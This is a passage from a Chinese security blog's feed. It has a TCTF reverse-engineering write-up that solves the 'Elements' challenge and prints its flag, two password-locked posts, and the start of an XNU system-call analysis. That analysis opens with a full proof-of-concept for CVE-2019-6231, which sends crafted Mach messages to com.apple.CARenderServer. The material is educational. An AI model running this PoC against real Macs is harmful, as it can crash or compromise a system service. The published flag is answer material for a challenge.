    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1/Swz8OMsU9sXxyIAhH6nULFb4rygW7Au7QcXFZAWu7F/HcPPkUC4UpnWEuXZGEcQOT4RuQ73NSxumVUfwXc1EXkZIsQleFe+lthNUAy2RO09f6E+Wk96VJpMrHnQKG2F0GBGsBiZvsC7W0rWcxjHkfeu0hj8R2TeaBjrxacCbYNvAdG8vo1Zg2/fNLyc7ryYFRE4N2KgSYVmMmI/hWjyoknIzA8yEVRfWz5Sl+q09bZ7z1wk7SO2eayZ1PsMtnWi8uqaWzTj860O7RkXmg6CSfHthsgqWxiBWkcu+FQu2MsPL22rS0AuCizJAe/E/vXhtTHak7ikf4pM6b3S9cD9ZitBDLTx8jALqhLzAKQ9yuh6XZAbXEZ2hmI8JXzA1asCsZwuzHlGle0zVG5Aj1fUaOaYgYBgdlUUaoLuJe98aW6FdaVuzkszdUEV+kg48iT9Lq3ZMoNkNOCCZjqzkHk8x+7r8jEypK3PITiCCpBDf/8pw8gGjiKv7dttRXA1nyymiKjjXJAmXGw2lYdYIrUgT7ljVssOp0CuPorYc/0pFIm8hhKP+U+AYY8/HWA6zRD9XGNG6SZUfrWaY3aNqVkHoc8/WHXIeO5cnz50YmyDlajK0GrthGGz2rSdzZZr40QYhyqCs79Pn8pryD9txDboK/LVkKG+42xzpr+LK5tE9U3m03yNPcS6JUTdPTs+teDAu08fxvK2gjRo07SJHTEA3Pvv9AfLl6U+Bhspa8Hw6oD+vX868MSGrBMneRSCVOZY8DwoUwO02Lk1bMwazf2gHF9dpv/vAQAVz/y2zlyWgrZgXhlxkGidAj3IAvfjUGUIsWDvmixKu/DOJpSF3DLqwcyLRnHWVOejCnFzDKJwcw7oVCrHoL5zhVt4OmWtW6tTyhZ3EyUnBSFlAIh4TVoUf6naWVzHEwuPQGPRoPhOmJSb9/jUUTSXjw3AOGI+lr0DTELvwr/syeo+M3tk7rH9WfG3v2ZsKbME4EUdEvZw36aFIyT9XwqgT0AeMou/PLPtS5YIymYPbGpnmy4U08ltH0owdB7FrNwbY6Bim6HdCuagJBX9B7yt64GAbkHA0uKY2yUn1pTfF3MuYz/WqJQssnYO0izEwyZZNmBCKBixsksslgc+SS0HG2ybmXkHPFLyZUUfSXR07qH/6UFOrcY7iCiOR0YCCyBm6fm4WTWVksPjOftBrTjFIktybTTMTOVT79IYR4e5sSFILJoK6HETcH2qthiVMUZdcGXNsyzSND+6g8wBhXrdSbOEKw4a/6Y4Thih5HZGgKs9eKti9YvyJwwj5cEA/ZmsUKG4CRxqkdMBW+HKZKKyXrMXib0+huiWuL9xhzS/EuLogUJi1YrWW+LdEEPwtHgSjkFiOHZUjWCVtvhLRX4ONgZhJsrfcWHVQWu31HCHRfMrfgBJGUyIXpdYmc8PqU0/+Wh0E0H+H36EiFp/E+ceyZ66r4iChpxlOmngXdUO0u9qmSvW9M2ijt/95SVqmi4ijiHxFNtK1JZ3ve4bv9OAbgHfq6KUiGOvCnI89j2A7MD4NYzUQH3vJ7cJaWAvl0MAzm6VhVbu+JqUZP5B+98bqMnO8UyVMIl0rdxXuEAdKgxzVrEC24UlualIZRgJFYgeclTD6toLmGJpYaWCXY9ZmsYhBPpJWpGHdLruR+A7XOSRno6pQHQjhS037qHC92biNMoz8GX70/2FMhPoximqGJNcsuO/gEDd9EE0thQj7wakajgxOUZgBCLQi+lM4Rb3UyztWSpyURfCMyOINlAibcB8CQggRIo/yFwhsimntOMne2+EwFC2vP/ZMml1K5PWvttfjr367CqwUyWd0iaooMZAreOUXhEt8F7d1bKYE9O/KOq15HfQyAxaDZxQfMIoCQmPtAJFNsXrbC8aW6ddUj7AfElfNW+QCf4A0pGe0mLnJ+kNaPu971RCoH5AIx3gFXcBb7fffnBVvg24x6rzI/2VYPNCWw88602cC1GQH5iJG0vgi+1UW5p48NIgCpbmwUu4dQ/KFqSxRA+S7LWtrVzpyUH9I+abBvxUCf2N6mYMhaKApZLYYKrS82hz5tTZ9BN2HHXsmPLBvOSL/48mX5tGcSwo9j5zCeCFxeGXgC1Vwi8FVqBRBo09VCIeoCAsnA9xOYzqowqPXDVJBzQ3Gx8JbcWdXDA1UZqFmtks6LLyo/56ECEGCvsZIH226HA/9A/cymWUuO2L9HgdDw5CE67cOc9/lPObYF/TEqQqyQaGX7uc4k4fswxmy4Ni+biTLYaSdU6ul0q9tw06TdXBiFzJLD4rPmeX1KrXiHUL2Nu/tGLF8Q/ByrR7jOcRknP1KaQ7WYp6EFmKJptOvffhPYHtvw4oM5WdMHCWgZwdc9KD0uRC3aiFkmU4YDA6vdmALGhQ6Z3J5Evszt0Lh4CqyFIdHxlIJ68FL/2dR7oQzUkbNNtZDo+Bjyw1A7WBypgYx++htvYapbl1RvkMiYFVlYzojFy8r0jyKWl4Qpf6SIyoB8It2t4GD/HD9dqvf06KsDg/qPrvLPDYibzXG8elOaHTixtOUMT3rdbu4mosIO7hJ3qO1tMAeJzA/gM0JBjkOLhh4KfnX8zu54yJcV33yg2CaclY6Mzq0YRYQkZv1L6eS5BdOUZr2vY7F7sZMkk7Sm3Xwro56ezz38DhK2SrMNfA49GznZDNXpjvFOll5A0Q==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, 